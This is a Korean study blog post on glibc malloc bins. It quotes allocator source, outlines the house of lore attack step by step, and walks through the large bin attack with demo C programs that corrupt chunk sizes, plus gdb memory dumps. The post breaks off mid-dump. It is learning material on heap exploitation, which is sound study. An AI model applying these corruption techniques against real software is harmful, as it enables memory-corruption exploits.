---
title: Bins
date: 2018-12-13 2:00
---

arena 구조에서는 free chunk를 재할당 할 수 있도록 관리하는 녀석들이 있는데 fastbin과 bins다. bins에는 unsorted bin, small bin, large bin이 있다. 

fastbin은 LIFO 구조기 때문에 free chunk의 fd가 바로 다음에 재할당 되고 bins는 FIFO구조기 때문에 bk가 바로 다음에 재할당 된다. 

<br>

#### Unsorted bin

small or large chunk이면서 top chunk가 아닐 경우 chunk가 free되면 unsorted bin에 들어가서 재할당을 기다리게 된다. unsorted bin은 size의 제한이 없이 1개의 bin으로 관리되며 마찬가지로 linked-list이기 때문에 여러 chunk가 연결될 수 있다.

smallbin chunk가 unsorted bin에 존재하는 상태에서 또 다른 smallbin chunk가 free 되면 계속 unsorted bin에 추가 되며 fastbin, largebin과 같이 다른 chunk가 free될 때 small bin으로 옮겨지게 된다. 

왜 unsorted bin을 사용하는지는 모르겠다 (재할당하기에 더 효율적인가보다..)

그리고 unsorted bin에 들어간 free chunk의 fd,bk는 main_arena+88 가 들어가 있는데 (1개의 free chunk만 있는 경우) 저 녀석은 top chunk를 가리키고 있다. main_arena는 libc안에 존재하므로 libc leak을 할 때 유용하게 쓰인다. 

```c
malloc.c

for (;; )
  {
    int iters = 0;
    while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
      {
        bck = victim->bk;
          ...
 
        /* remove from unsorted list */
        unsorted_chunks (av)->bk = bck;
        bck->fd = unsorted_chunks (av);
 
          ...
      }
```

unsorted chunk의 bk값을 변경하면 vintim의 값이 변경되고 변경된 victim의 bk값을 bck에 저장한다. unsorted chunk의 bk 값 +0x10 영역에 main_arena.top(main_arena+88(64bit))의 주소값을 저장할 수 있다. (unsorted_chunks() 함수는 main_arena.top의 주소를 리턴 한다고 한다.) 

<br>

#### Smallbin

62개의 bin으로 관리한다.

32bit 기준 0x10 ~ 0x1f8, 64bit 기준 0x20 ~ 0x3f0

또한 smallbin과 largebin은 인접 chunk가 free되었다면 chunk를 병합시킨다.

```c
malloc.c

if (in_smallbin_range (nb))
  {
    idx = smallbin_index (nb);
    bin = bin_at (av, idx);
 
    if ((victim = last (bin)) != bin)
      {
        if (victim == 0) /* initialization check */
          malloc_consolidate (av);
        else
          {
            bck = victim->bk;
  if (__glibc_unlikely (bck->fd != victim))
              {
                errstr = "malloc(): smallbin double linked list corrupted";
                goto errout;
              }
            set_inuse_bit_at_offset (victim, nb);
            bin->bk = bck;
            bck->fd = bin;
 
            if (av != &main_arena)
              victim->size |= NON_MAIN_ARENA;
            check_malloced_chunk (av, victim, nb);
            void *p = chunk2mem (victim);
            alloc_perturb (p, bytes);
            return p;
          }
      }
  }
```

smallbin도 마찬가지로 free chunk의 bk를 변조해주면 되는데  bk에 덮어쓴 fake chunk의 fd가 free chunk를 가리키고 있어야 한다.

대표적인 공격으로 **house_of_lore**가 있다.

간단하게 smallbin을 이용해서 원하는 fake chunk에 할당받는 공격이다. 

size가 다른 small chunk이상의 chunk를 2개 할당 -> small chunk free -> small free chunk의 bk를 할당받고 싶은 주소로 덮어쓴다.(header는 생각해서 알아서) -> 2번 째 chunk보다 큰 크기의 chunk를 할당 -> small free chunk가 smallbin에 등록 -> free chunk와 동일한 size로 2개 할당받으면 fake chunk에 할당된다.

```c
          bck = victim->bk;
if (__glibc_unlikely (bck->fd != victim))
            {
              errstr = "malloc(): smallbin double linked list corrupted";
              goto errout;
            }
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck;
          bck->fd = bin;
```

bck -> fd != victim 이 조건을 우회하기 위해서 fake chunk가 필요하다. free chunk -> bk = fake chunk, fake chunk -> fd = free chunk를 만족시켜야 하기 때문에 공격을 진행하기 전 fake chunk구조를 어떠한 영역에 만들어 놓아야 한다.

fake chunk가 2개가 필요하다. 결국 free chunk -> bk = fake1 , fake1 -> fd = free chunk, fake1 -> bk = fake2, fake2 -> fd = fake1 요런식으로 맞춰줘야 한다.(왜 fake chunk 1개만으로는 안되는지 모르겠다 ㅠㅠ 알아보려고했는데 저 제약조건에서는 free chunk와 fake1만 맞춰주면 되는 것 같은데...) 

<br>

#### Largebin

63개의 bin이 존재한다

마찬가지로 FIFO에 double-linked-list이다. (자세한 내용은 basic에 있다)

smallbin과는 다르게 bins_index가 나타내는 크기보다 작은 크기의 chunk도 모두 포함한다고 한다. 대신 할당의 효율성을 높이기 위해서 해당 bin내에서 크기 별로 정렬되고 fd_nextsize와 bk_nextsize 필드가 사용된다. 

largebin으로 뭐 할 수 있는게 딱히 없을줄 알았는데 large bin attack이 불과 몇달 전에 나왔다..! 

#### large bin attack

아니 이거 .... 어렵다 ㅠ

참조 : https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/

```c
while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
{
    bck = victim->bk;
    if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0)
        || __builtin_expect (chunksize_nomask (victim)
                   > av->system_mem, 0))
            malloc_printerr (check_action, "malloc(): memory corruption",
                             chunk2mem (victim), av);
    size = chunksize (victim);
 
    /*
      If a small request, try to use last remainder if it is the
      only chunk in unsorted bin.  This helps promote locality for
      runs of consecutive small requests. This is the only
      exception to best-fit, and applies only when there is
      no exact fit for a small chunk.
    */
 
    if (in_smallbin_range (nb) &&
        bck == unsorted_chunks (av) &&
        victim == av->last_remainder &&
        (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
    {
        /* split and reattach remainder */
        remainder_size = size - nb;
        remainder = chunk_at_offset (victim, nb);
        unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
        av->last_remainder = remainder;
        remainder->bk = remainder->fd = unsorted_chunks (av);
        if (!in_smallbin_range (remainder_size))
        {
            remainder->fd_nextsize = NULL;
            remainder->bk_nextsize = NULL;
        }
 
        set_head (victim, nb | PREV_INUSE |
                  (av != &main_arena ? NON_MAIN_ARENA : 0));
        set_head (remainder, remainder_size | PREV_INUSE);
        set_foot (remainder, remainder_size);
 
        check_malloced_chunk (av, victim, nb);
        void *p = chunk2mem (victim);
        alloc_perturb (p, bytes);
        return p;
    }
 
    /* remove from unsorted list */
    unsorted_chunks (av)->bk = bck;
    bck->fd = unsorted_chunks (av);
 
    /* Take now instead of binning if exact fit */
 
    if (size == nb)
    {
         set_inuse_bit_at_offset (victim, size);
         if (av != &main_arena)
             set_non_main_arena (victim);
         check_malloced_chunk (av, victim, nb);
         void *p = chunk2mem (victim);
         alloc_perturb (p, bytes);
         return p;
    }
 
    /* place chunk in bin */
    if (in_smallbin_range (size))
    {
        victim_index = smallbin_index (size);
        bck = bin_at (av, victim_index);
        fwd = bck->fd;
    }
    else
    {
        victim_index = largebin_index (size);
        bck = bin_at (av, victim_index);
        fwd = bck->fd;
 
        /* maintain large bins in sorted order */
        if (fwd != bck)
        {
             /* Or with inuse bit to speed comparisons */
             size |= PREV_INUSE;
             /* if smaller than smallest, bypass loop below */
             assert (chunk_main_arena (bck->bk));
             if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk))
             {
                 fwd = bck;
                 bck = bck->bk;
                 victim->fd_nextsize = fwd->fd;
                 victim->bk_nextsize = fwd->fd->bk_nextsize;
                 fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
              }
              else
              {
                  assert (chunk_main_arena (fwd));
                  while ((unsigned long) size < chunksize_nomask (fwd))
                  {
                      fwd = fwd->fd_nextsize;
                      assert (chunk_main_arena (fwd));
                  }
 
                  if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))
                        /* Always insert in the second position.  */
                        fwd = fwd->fd;
                  else
                  {
                      victim->fd_nextsize = fwd;
                      victim->bk_nextsize = fwd->bk_nextsize;
                      fwd->bk_nextsize = victim;
                      victim->bk_nextsize->fd_nextsize = victim;
                  }
                  bck = fwd->bk;
              }
          }
          else
              victim->fd_nextsize = victim->bk_nextsize = victim;
    }

    mark_bin (av, victim_index);
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;
 
#define MAX_ITERS       10000
    if (++iters >= MAX_ITERS)
        break;
}
```

루프의 각 반복에서 unsorted bin의 마지막 chunk가 검색된다. 더 이상 chunk가 없으면 루프가 종료된다.

검색 된 chunk가 처리 되는 방식

1. chunk가 마지막 chunk이고 요청한 바이트가 MIN_LARGE_SIZE 미만이고 bin에 들어간 chunk와 같은 size라면 검요청한 크기 가 할당되고 나머지 chunk는 unsorted bin에 삽입된다. (오오 위에 그대로)

2. 1번 케이스가 아닌 경우 unsorted bin에서 제거하고 제거 된 chunk의 크기가 요청 된 크기와 같으면 chunk를 직접 반환한다. 제거된 chunk의 크기가 small chunk 범위 안에 있다면 해당 small chunk를 smallbin에 넣는다. 

   (2-3-1) 제거 된 chunk가 large chunk의 범위라면 large bin에 사용 가능한 chunk가 없는 경우, 제거 된 chunk를 현재 large bin에 삽입하고, fd_nextsize와 bk_nextsize를 제거 된 chunk로 설정한다. 

   (2-3-2-1) larg bin에 사용 가능한 chunk가 있는 경우에 large bin의 마지막 chunk 크기가 제거 된 chunk보다 크다면 제거된 chunk를 마지막 chunk로 large bin에 등록한다. 

   (2-3-2-2) 그 반대로 제거 된 chunk가 더 작다면 large bin의 첫 번째 chunk에서 트래버스(?)를 하기 시작한다고 한다. 이 트래버스는 chunk의 fd_nextsize를 기반으로 하고 크기가 제거 된 chunk보다 작거나 같은 chunk fwd에 도달 할 때까지 반복한다.

   (2-3-2-2-1) fwd의 크기가 제거 된 chunk와 같으면 제거 된 chunk를 fwd 다음으로 unsorted bin에 삽입한다.

   (2-3-2-2-2) fwd의 크기가 제거 된 chunk보다 작으면 제거 된 chunk의 fd_nextsize에 fwd를 지정하고 제거 된 chunk의 bk_nextsize까지 이전의 chunk를 할당한다. 그 후에 제거 된 chunk를 fwd 직전에 unsorted bin에 삽입한다.

1번과 2-1번을 제외하고 모든 로직은 chunk를 반환하지 않는다. 요청 된 chunk는 __int_malloc에 의해 반환되는데.. 범위에 벗어나기 때문에 설명하지 않는 듯 하다. 

간단히 말해서 할당자는 smallbin과 largebin을 탐색하고 요청 된 크기에 맞는 가장 작은 chunk를 찾고, chunk를 분할하고, 나머지 chunk를 unsorted bin에 등록한다. 적절한 chunk가 없다면 맨 위의 chunk를 분할한다.

```c
#include<stdlib.h>
 
int main()
{
    unsigned long *p1, *p2, *p3, *p4, *p5, *p6, *p7, *p8, *p9, *p10;
    unsigned long *p;
    p1 = malloc(0x3f0);
    p2 = malloc(0x20);
    p3 = malloc(0x400);
    p4 = malloc(0x20);
    p5 = malloc(0x400);
    p6 = malloc(0x20);
    p7 = malloc(0x120);
    p8 = malloc(0x20);
    p9 = malloc(0x140);
    p10 = malloc(0x20);
    free(p7);
    free(p9);
 
    p = malloc(0x60);
    p = malloc(0xb0);
 
    free(p1);
    free(p3);
    free(p5);
 
    p = malloc(0x110);
 
    return 0;
}
```

이제 예제 코드로 large bin을 어떤식으로 구성해야 하는지 살펴본다고 한다.

```c
gdb-peda$ x/40gx 0x7ffff7dd1bb8 - 152
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602f90
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x0000000000602e10
0x7ffff7dd1b90 <main_arena+112>:	0x0000000000602cb0	0x00007ffff7dd1b88
0x7ffff7dd1ba0 <main_arena+128>:	0x00007ffff7dd1b88	0x00007ffff7dd1b98

addr                prev                size                 status              fd                bk
0x602000            0x0                 0x400                Used                None              None
0x602400            0x0                 0x30                 Used                None              None
0x602430            0x0                 0x410                Used                None              None
0x602840            0x0                 0x30                 Used                None              None
0x602870            0x0                 0x410                Used                None              None
0x602c80            0x0                 0x30                 Used                None              None
0x602cb0            0x0                 0x130                Freed     0x7ffff7dd1b78          0x602e10
0x602de0            0x130               0x30                 Used                None              None
0x602e10            0x0                 0x150                Freed           0x602cb0    0x7ffff7dd1b78
0x602f60            0x150               0x30                 Used                None              None

gdb-peda$ x/6gx 0x602cb0
0x602cb0:	0x0000000000000000	0x0000000000000131
0x602cc0:	0x00007ffff7dd1b78	0x0000000000602e10
0x602cd0:	0x0000000000000000	0x0000000000000000
gdb-peda$ x/6gx 0x602e10
0x602e10:	0x0000000000000000	0x0000000000000151
0x602e20:	0x0000000000602cb0	0x00007ffff7dd1b78
0x602e30:	0x0000000000000000	0x0000000000000000

==================  Main Arena  ==================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x602f90 (size : 0x20070)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x602e10 (size : 0x150) <--> 0x602cb0 (size : 0x130)
```

free p7,p9 를 한 후 main_arena 구조와 p7,p9의 구조이다. free 된 두 chunk가 unsorted bin에 들어가 있다.

```c
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602f90
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000602d20	0x0000000000602d20
0x7ffff7dd1b90 <main_arena+112>:	0x0000000000602d20	0x00007ffff7dd1b88
0x7ffff7dd1ba0 <main_arena+128>:	0x00007ffff7dd1b88	0x00007ffff7dd1b98
0x7ffff7dd1bb0 <main_arena+144>:	0x00007ffff7dd1b98	0x00007ffff7dd1ba8
0x7ffff7dd1bc0 <main_arena+160>:	0x00007ffff7dd1ba8	0x00007ffff7dd1bb8
0x7ffff7dd1bd0 <main_arena+176>:	0x00007ffff7dd1bb8	0x00007ffff7dd1bc8
0x7ffff7dd1be0 <main_arena+192>:	0x00007ffff7dd1bc8	0x00007ffff7dd1bd8
0x7ffff7dd1bf0 <main_arena+208>:	0x00007ffff7dd1bd8	0x00007ffff7dd1be8
0x7ffff7dd1c00 <main_arena+224>:	0x00007ffff7dd1be8	0x00007ffff7dd1bf8
0x7ffff7dd1c10 <main_arena+240>:	0x00007ffff7dd1bf8	0x00007ffff7dd1c08
0x7ffff7dd1c20 <main_arena+256>:	0x00007ffff7dd1c08	0x00007ffff7dd1c18
0x7ffff7dd1c30 <main_arena+272>:	0x00007ffff7dd1c18	0x00007ffff7dd1c28
0x7ffff7dd1c40 <main_arena+288>:	0x00007ffff7dd1c28	0x00007ffff7dd1c38
0x7ffff7dd1c50 <main_arena+304>:	0x00007ffff7dd1c38	0x00007ffff7dd1c48
0x7ffff7dd1c60 <main_arena+320>:	0x00007ffff7dd1c48	0x00007ffff7dd1c58
0x7ffff7dd1c70 <main_arena+336>:	0x00007ffff7dd1c58	0x00007ffff7dd1c68
0x7ffff7dd1c80 <main_arena+352>:	0x00007ffff7dd1c68	0x00007ffff7dd1c78
0x7ffff7dd1c90 <main_arena+368>:	0x00007ffff7dd1c78	0x00007ffff7dd1c88
0x7ffff7dd1ca0 <main_arena+384>:	0x00007ffff7dd1c88	0x00007ffff7dd1c98
0x7ffff7dd1cb0 <main_arena+400>:	0x00007ffff7dd1c98	0x00007ffff7dd1ca8
0x7ffff7dd1cc0 <main_arena+416>:	0x00007ffff7dd1ca8	0x0000000000602e10
0x7ffff7dd1cd0 <main_arena+432>:	0x0000000000602e10	0x00007ffff7dd1cc8

0x602cb0            0x0                 0x70                 Used                None              None
0x602d20            0x0                 0xc0                 Freed     0x7ffff7dd1b78    0x7ffff7dd1b78

gdb-peda$ x/6gx 0x602d20
0x602d20:	0x0000000000000000	0x00000000000000c1
0x602d30:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x602d40:	0x0000000000000000	0x0000000000000000
gdb-peda$ ar
==================  Main Arena  ==================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x602f90 (size : 0x20070)
       last_remainder: 0x602d20 (size : 0xc0)
            unsortbin: 0x602d20 (size : 0xc0)
(0x150)  smallbin[19]: 0x602e10
```

으아 main_arena 구조를 잘 모르겠다; 그래도 how2heap 예제와 같이 일부는 할당되고 나머지 부분은 free -> unsorted bin에 등록된 상태이다. 0x602d20 이 remainder chunk가 되었다.

```c
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602f90
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000602d20	0x00007ffff7dd1b78
0x7ffff7dd1b90 <main_arena+112>:	0x00007ffff7dd1b78	0x00007ffff7dd1b88
0x7ffff7dd1ba0 <main_arena+128>:	0x00007ffff7dd1b88	0x00007ffff7dd1b98

==================  Main Arena  ==================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x602f90 (size : 0x20070)
       last_remainder: 0x602d20 (size : 0xc0)
            unsortbin: 0x0
(0x150)  smallbin[19]: 0x602e10
```

main_arena 구조가 또 바뀌었고 나머지 영역도 할당되고 smallbin에 0x602e10 하나만 들어가 있다.

```c
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602f90
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000602d20	0x0000000000602870
0x7ffff7dd1b90 <main_arena+112>:	0x0000000000602000	0x00007ffff7dd1b88

==================  Main Arena  ==================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x602f90 (size : 0x20070)
       last_remainder: 0x602d20 (size : 0xc0)
            unsortbin: 0x602870 (size : 0x410) <--> 0x602430 (size : 0x410) <--> 0x602000 (size : 0x400)
(0x150)  smallbin[19]: 0x602e10
```

p1,p3,p5 를 해제하고나면 unsortedbin에 세 녀석이 들어가게 된다.

```c
// unsorted bin
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602f90
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000602f30	0x0000000000602f30
0x7ffff7dd1b90 <main_arena+112>:	0x0000000000602f30	0x00007ffff7dd1b88

// large bin
0x7ffff7dd1f20 <main_arena+1024>:	0x00007ffff7dd1f08	0x00007ffff7dd1f18
0x7ffff7dd1f30 <main_arena+1040>:	0x00007ffff7dd1f18	0x00007ffff7dd1f28
0x7ffff7dd1f40 <main_arena+1056>:	0x00007ffff7dd1f28	0x00007ffff7dd1f38
0x7ffff7dd1f50 <main_arena+1072>:	0x00007ffff7dd1f38	0x00007ffff7dd1f48
0x7ffff7dd1f60 <main_arena+1088>:	0x00007ffff7dd1f48	0x00007ffff7dd1f58
0x7ffff7dd1f70 <main_arena+1104>:	0x00007ffff7dd1f58	0x0000000000602430
0x7ffff7dd1f80 <main_arena+1120>:	0x0000000000602000	0x00007ffff7dd1f78

gdb-peda$ x/6gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000401
0x602010:	0x00007ffff7dd1f68	0x0000000000602870
0x602020:	0x0000000000602430	0x0000000000602430
gdb-peda$ x/6gx 0x602430
0x602430:	0x0000000000000000	0x0000000000000411
0x602440:	0x0000000000602870	0x00007ffff7dd1f68
0x602450:	0x0000000000602000	0x0000000000602000
gdb-peda$ x/6gx 0x602870
0x602870:	0x0000000000000000	0x0000000000000411
0x602880:	0x0000000000602000	0x0000000000602430
0x602890:	0x0000000000000000	0x0000000000000000
```

p1, p3에 fd_nextsize, bk_nextsize가 설정되었다. 

```c
==================  Main Arena  ==================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x602f90 (size : 0x20070)
       last_remainder: 0x602f30 (size : 0x30)
            unsortbin: 0x602f30 (size : 0x30)
         largebin[64]: 0x602430 (size : 0x410) <--> 0x602870 (size : 0x410) <--> 0x602000 (size : 0x400)
```

이걸 보면 largebin은 size가 내림차순으로 정렬되어 있는 것을 알 수 있다. 처음 chunk는 가장 큰 size이고 마지막 chunk는 가장 작은 size 이다. 문제는 chunk가 내림차순으로 구성되어 있는지에 대한 검사가 없다는 점이다. 다음 예제 코드를 보자.

```c
#include<stdlib.h>
 
int main()
{
    unsigned long *p1, *p2, *p3, *p4, *p5, *p6, *p7, *p8, *p9, *p10, *p11, *p12;
    unsigned long *p;
    p1 = malloc(0x3f0);
    p2 = malloc(0x20);
    p3 = malloc(0x400);
    p4 = malloc(0x20);
    p5 = malloc(0x400);
    p6 = malloc(0x20);
    p7 = malloc(0x120);
    p8 = malloc(0x20);
    p9 = malloc(0x140);
    p10 = malloc(0x20);
    p11 = malloc(0x400);
    p12 = malloc(0x20);
    free(p7);
    free(p9);
 
    p = malloc(0x60);
    p = malloc(0xb0);
 
    free(p1);
    free(p3);
    free(p5);
 
    p = malloc(0x60);
 
    free(p11);
 
    //step 2-3-2-1
    //(2-3-2-1) larg bin에 사용 가능한 chunk가 있는 경우에 large bin의 마지막 chunk 크기가 제거 된 chunk보다 크다면 제거된 chunk를 마지막 chunk로 large bin에 등록한다. 
    //*(p1-1) = 0x421;
    //p = malloc(0x60);
     
    //step 2-3-2-2-1
    //(2-3-2-2-1) fwd의 크기가 제거 된 chunk와 같으면 제거 된 chunk를 fwd 다음으로 unsorted bin에 삽입한다.
    //p = malloc(0x60);
     
    //step 2-3-2-2-2
    //(2-3-2-2-2) fwd의 크기가 제거 된 chunk보다 작으면 제거 된 chunk의 fd_nextsize에 fwd를 지정하고 제거 된 chunk의 bk_nextsize까지 이전의 chunk를 할당한다. 그 후에 제거 된 chunk를 fwd 직전에 unsorted bin에 삽입한다.
    //*(p3-1) = 0x3f1;
    //p = malloc(0x60);
 
    return 0;
}
```

예제 디버깅을 그대로 가져다 썼다.. ㅠ 

#### (2-3-2-1)

size를 0x421로 변조했기 때문에 삽입 할 chunk보다 크다. 그렇기 때문에 large bin으로 들어가게 된다.

```c
(gdb) x/20gx &__malloc_hook+0x80
0x7ffff7dd3ef0 <main_arena+1008>: 0x00007ffff7dd3ed8  0x00007ffff7dd3ee8
0x7ffff7dd3f00 <main_arena+1024>: 0x00007ffff7dd3ee8  0x00007ffff7dd3ef8
0x7ffff7dd3f10 <main_arena+1040>: 0x00007ffff7dd3ef8  0x00007ffff7dd3f08
0x7ffff7dd3f20 <main_arena+1056>: 0x00007ffff7dd3f08  0x00007ffff7dd3f18
0x7ffff7dd3f30 <main_arena+1072>: 0x00007ffff7dd3f18  0x00007ffff7dd3f28
0x7ffff7dd3f40 <main_arena+1088>: 0x00007ffff7dd3f28  0x00007ffff7dd3f38
0x7ffff7dd3f50 <main_arena+1104>: 0x00007ffff7dd3f38  0x0000000000602430
0x7ffff7dd3f60 <main_arena+1120>: 0x0000000000602f90  0x00007ffff7dd3f58
0x7ffff7dd3f70 <main_arena+1136>: 0x00007ffff7dd3f58  0x00007ffff7dd3f68
0x7ffff7dd3f80 <main_arena+1152>: 0x00007ffff7dd3f68  0x00007ffff7dd3f78
(gdb) x/8gx 0x0000000000602430 //p3
0x602430:   0x0000000000000000  0x0000000000000411
0x602440:   0x0000000000602870  0x00007ffff7dd3f48
0x602450:   0x0000000000602000  0x0000000000602f90
0x602460:   0x0000000000000000  0x0000000000000000
(gdb) x/8gx 0x0000000000602870 //p5
0x602870:   0x0000000000000000  0x0000000000000411
0x602880:   0x0000000000602000  0x0000000000602430
0x602890:   0x0000000000000000  0x0000000000000000
0x6028a0:   0x0000000000000000  0x0000000000000000
(gdb) x/8gx 0x0000000000602000 //p1
0x602000:   0x0000000000000000  0x0000000000000421
0x602010:   0x0000000000602f90  0x0000000000602870
0x602020:   0x0000000000602f90  0x0000000000602430
0x602030:   0x0000000000000000  0x0000000000000000
//unsorted bin에서 제거 된 chunk가 large bin에 등록된다. 
(gdb) x/8gx 0x0000000000602f90 //p11
0x602f90:   0x0000000000000000  0x0000000000000411
0x602fa0:   0x00007ffff7dd3f48  0x0000000000602000
0x602fb0:   0x0000000000602430  0x0000000000602000
0x602fc0:   0x0000000000000000  0x0000000000000000
```

#### (2-3-2-2-1)

여기선 아무런 손상도 주지 않는다. 제거 된 chunk의 크기는 0x411이고 마지막 chunk의 크기보다 크고 첫 번째 chunk와 같다. large bin의 첫 번째 chunk 뒤에 등록된다.

```c
0x7ffff7dd3ef0 <main_arena+1008>: 0x00007ffff7dd3ed8  0x00007ffff7dd3ee8
0x7ffff7dd3f00 <main_arena+1024>: 0x00007ffff7dd3ee8  0x00007ffff7dd3ef8
0x7ffff7dd3f10 <main_arena+1040>: 0x00007ffff7dd3ef8  0x00007ffff7dd3f08
0x7ffff7dd3f20 <main_arena+1056>: 0x00007ffff7dd3f08  0x00007ffff7dd3f18
0x7ffff7dd3f30 <main_arena+1072>: 0x00007ffff7dd3f18  0x00007ffff7dd3f28
0x7ffff7dd3f40 <main_arena+1088>: 0x00007ffff7dd3f28  0x00007ffff7dd3f38
0x7ffff7dd3f50 <main_arena+1104>: 0x00007ffff7dd3f38  0x0000000000602430
0x7ffff7dd3f60 <main_arena+1120>: 0x0000000000602000  0x00007ffff7dd3f58
0x7ffff7dd3f70 <main_arena+1136>: 0x00007ffff7dd3f58  0x00007ffff7dd3f68
0x7ffff7dd3f80 <main_arena+1152>: 0x00007ffff7dd3f68  0x00007ffff7dd3f78
(gdb) x/8gx 0x602430 //p3
0x602430:   0x0000000000000000  0x0000000000000411
0x602440:   0x0000000000602f90  0x00007ffff7dd3f48
0x602450:   0x0000000000602000  0x0000000000602000
0x602460:   0x0000000000000000  0x0000000000000000
//large bin의 첫 번째 chunk 바로 뒤에 등록
(gdb) x/8gx 0x602f90 //p11
0x602f90:   0x0000000000000000  0x0000000000000411
0x602fa0:   0x0000000000602870  0x0000000000602430
0x602fb0:   0x0000000000000000  0x0000000000000000
0x602fc0:   0x0000000000000000  0x0000000000000000
(gdb) x/8gx 0x602870 //p5
0x602870:   0x0000000000000000  0x0000000000000411
0x602880:   0x0000000000602000  0x0000000000602f90
0x602890:   0x0000000000000000  0x0000000000000000
0x6028a0:   0x0000000000000000  0x0000000000000000
(gdb) x/8gx 0x602000 //p1
0x602000:   0x0000000000000000  0x0000000000000401
0x602010:   0x00007ffff7dd3f48  0x0000000000602870
0x602020:   0x0000000000602430  0x0000000000602430
0x602030:   0x0000000000000000  0x0000000000000000
```

#### (2-3-2-2-2)

삽입 될 chunk보다 작은 0x401로 변조했기 때문에 large bin의 첫 번째 chunk로 등록이되고, 그에 따라서 fd_nextsize, bk_nextsize가 재설정 된다.

```c
(gdb) x/20gx &__malloc_hook+0x80
0x7ffff7dd3ef0 <main_arena+1008>: 0x00007ffff7dd3ed8  0x00007ffff7dd3ee8
0x7ffff7dd3f00 <main_arena+1024>: 0x00007ffff7dd3ee8  0x00007ffff7dd3ef8
0x7ffff7dd3f10 <main_arena+1040>: 0x00007ffff7dd3ef8  0x00007ffff7dd3f08
0x7ffff7dd3f20 <main_arena+1056>: 0x00007ffff7dd3f08  0x00007ffff7dd3f18
0x7ffff7dd3f30 <main_arena+1072>: 0x00007ffff7dd3f18  0x00007ffff7dd3f28
0x7ffff7dd3f40 <main_arena+1088>: 0x00007ffff7dd3f28  0x00007ffff7dd3f38
0x7ffff7dd3f50 <main_arena+1104>: 0x00007ffff7dd3f38  0x0000000000602f90
